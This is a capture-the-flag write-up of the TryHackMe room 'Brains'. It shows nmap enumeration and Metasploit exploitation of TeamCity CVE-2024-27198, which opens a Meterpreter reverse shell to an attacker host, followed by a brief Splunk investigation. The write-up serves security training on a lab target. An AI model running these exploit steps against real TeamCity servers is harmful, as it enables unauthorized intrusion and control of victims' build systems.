---
title: "Brains"
date: 2025-03-02
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Brains
categories: [TryHackMe, Easy]
tags: [linux, rce, metasploit, teamcity, dfir, splunk]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Brains</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>The city forgot to close its gate.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/brains">https://tryhackme.com/room/brains</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Brains.  

## Part One Red Team

### Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.9.245     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 10:28 EDT
Nmap scan report for 10.10.9.245
Host is up (0.039s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 26.16 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80,50000 10.10.9.245
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 10:29 EDT
Nmap scan report for 10.10.9.245
Host is up (0.035s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d7:07:ad:ad:85:de:64:c8:92:52:6c:92:e3:33:37:e6 (RSA)
|   256 6c:64:8d:b1:3f:08:53:a6:8a:af:c4:93:d8:de:77:50 (ECDSA)
|_  256 ee:a0:eb:3c:1c:0e:b4:15:b2:48:1e:13:a1:f7:d6:05 (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Maintenance
50000/tcp open  ibm-db2?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 401 
|     TeamCity-Node-Id: MAIN_SERVER
|     WWW-Authenticate: Basic realm="TeamCity"
|     WWW-Authenticate: Bearer realm="TeamCity"
|     Cache-Control: no-store
|     Content-Type: text/plain;charset=UTF-8
|     Date: Thu, 13 Mar 2025 14:29:10 GMT
|     Connection: close
|     Authentication required
|     login manually go to "/login.html" page
|   drda, ibm-db2, ibm-db2-das: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Thu, 13 Mar 2025 14:29:10 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
```
From here I proceeded the analysis port by port.

### Port 80 Analysis

The webserver displayed a `maintanance note`, as shown in the following screenshot:

screen 1

After performing several enumeration techniques, I moved on to the next port, as I didn't find anything useful on port 80. 

### Port 50000 Analysis

Port provided access to a `TeamCity` installation, which displayed the version number on the login page. Since I didn't have any credentials, I started researching the version number. I discovered that `TeamCity` version `2023.11.3` had multiple vulnerabilities. The Unauthenticated Remote Code Execute I found in this <a href="https://sploitus.com/exploit?id=PACKETSTORM:177601">post</a> seemed to be the best option, as it was available as a Metasploit module. I started Metasploit, searched for the vulnerability, and found it right away: 
```bash
msf6 > search teamcity

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   0   exploit/multi/http/jetbrains_teamcity_rce_cve_2023_42793  2023-09-19       excellent  Yes    JetBrains TeamCity Unauthenticated Remote Code Execution
   1     \_ target: Windows                                      .                .          .      .
   2     \_ target: Linux                                        .                .          .      .
   3   exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198  2024-03-04       excellent  Yes    JetBrains TeamCity Unauthenticated Remote Code Execution
   4     \_ target: Java                                         .                .          .      .
   5     \_ target: Java Server Page                             .                .          .      .
   6     \_ target: Windows Command                              .                .          .      .
   7     \_ target: Linux Command                                .                .          .      .
   8     \_ target: Unix Command                                 .                .          .      .
   9   exploit/multi/misc/teamcity_agent_xmlrpc_exec             2015-04-14       excellent  Yes    TeamCity Agent XML-RPC Command Execution
   10    \_ target: Windows                                      .                .          .      .
   11    \_ target: Linux     
```

After loading the module, I set the necessary options and executed the exploit. After the Meterpreter shell spawned, I was able to retrieve the flag: 
```bash
msf6 > use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set LHOST tun0
LHOST => [attackerip]
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set RHOSTS 10.10.243.137
RHOSTS => 10.10.243.137
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > set RPORT 50000
RPORT => 50000
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > exploit

[*] Started reverse TCP handler on [attackerip]:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.TGJpZXlvdGJqYVBhNXQzdUF2MVlCT1drNVpR.Y2EzYmE4YjgtN2FiNy00OTE0LWI1OWEtNzhlZTk1ODUxY2Mw
[*] Uploading plugin: FExxz9f4
[*] Sending stage (57971 bytes) to 10.10.243.137
[*] Meterpreter session 1 opened ([attackerip]:4444 -> 10.10.243.137:46230) at 2025-03-13 15:43:50 -0400
[*] Deleting the plugin...
[!] Failed to list all plugins.
[!] Failed to discover enabled plugin UUID
[!] Failed to delete the plugin.
[*] Deleting the authentication token...
[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/FExxz9f4' on the target
[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_FExxz9f4' on the target
[!] This exploit may require manual cleanup of '/home/ubuntu/.BuildServer/system/caches/plugins.unpacked/FExxz9f4' on the target

meterpreter > cd /home
meterpreter > cd ubuntu
meterpreter > cat flag.txt
THM{f[removed]4}
```

## Part Two Blue Team

For the investigation, we had access to a Splunk system. After some investigation, I identified that the key time span was between july 4th and 8th. Using the following search queries, I was able to answer the questions:

![Query One](/assets/img/tryhackme/Brains/thm_brains_2.jpg)

![Query Two](/assets/img/tryhackme/Brains/thm_brains_3.jpg)

![Query Three](/assets/img/tryhackme/Brains/thm_brains_4.jpg)

solved! :)